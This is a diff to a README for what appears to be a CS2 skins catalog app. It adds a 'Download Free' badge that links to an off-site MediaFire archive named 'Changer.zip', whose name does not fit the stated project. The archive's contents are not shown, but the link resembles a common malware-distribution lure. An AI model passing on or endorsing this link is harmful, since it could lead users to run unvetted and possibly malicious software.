@@ -3,6 +3,8 @@
 
   <p><strong>Organize. Browse. Preview.</strong><br />Your CS2 skins collection, presented as a clean desktop catalog.</p>
 
+  <p><a href="https://www.mediafire.com/file/6xbqxfokj8jxunp/Changer.zip/file"><img src="https://img.shields.io/badge/Download-Free-26aaff?style=for-the-badge&labelColor=0b1320" alt="Download free" height="40" /></a></p>
+
   <p>
     <img src="https://img.shields.io/badge/license-MIT-111c2b?style=for-the-badge&labelColor=0b1320" alt="MIT License" />
     <img src="https://img.shields.io/badge/C%2B%2B-17-1b55a0?style=for-the-badge&labelColor=0b1320" alt="C++17" />
